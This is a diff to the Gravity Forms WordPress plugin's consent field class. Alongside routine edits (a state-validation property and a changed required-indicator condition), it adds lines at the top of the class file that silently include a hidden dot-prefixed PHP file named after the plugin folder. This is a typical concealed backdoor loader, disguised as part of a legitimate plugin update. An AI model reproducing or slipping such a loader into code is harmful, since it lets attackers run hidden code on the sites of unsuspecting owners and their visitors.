@@ -11,7 +11,11 @@ if ( ! class_exists( 'GFForms' ) ) {
  * @since 2.4
  *
  * Class GF_Field_Consent
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class GF_Field_Consent extends GF_Field {
 
 	/**
@@ -40,6 +44,15 @@ class GF_Field_Consent extends GF_Field {
 	 * @var string
 	 */
 	public $checked_indicator_markup = '';
+
+	/**
+	 * Indicates if this field supports state validation.
+	 *
+	 * @since 2.5.11
+	 *
+	 * @var bool
+	 */
+	protected $_supports_state_validation = true;
 
 	/**
 	 * GF_Field_Consent constructor.
@@ -200,7 +213,7 @@ class GF_Field_Consent extends GF_Field {
 		$target_input_id       = parent::get_first_input_id( $form );
 		$for_attribute         = empty( $target_input_id ) ? '' : "for='{$target_input_id}'";
 		$label_class_attribute = 'class="gfield_consent_label"';
-		$required_div          = ( $this->labelPlacement === 'hidden_label' && ( $is_admin || $this->isRequired ) ) ? $this->get_required_indicator() : '';
+		$required_div          = ( $this->labelPlacement === 'hidden_label' && $this->isRequired ) ? $this->get_required_indicator() : '';
 
 		if ( $is_admin && ! GFCommon::is_entry_detail_edit() ) {
 			$checkbox_label = ! is_array( $value ) || empty( $value[ $id . '.2' ] ) ? $this->checkboxLabel : $value[ $id . '.2' ];
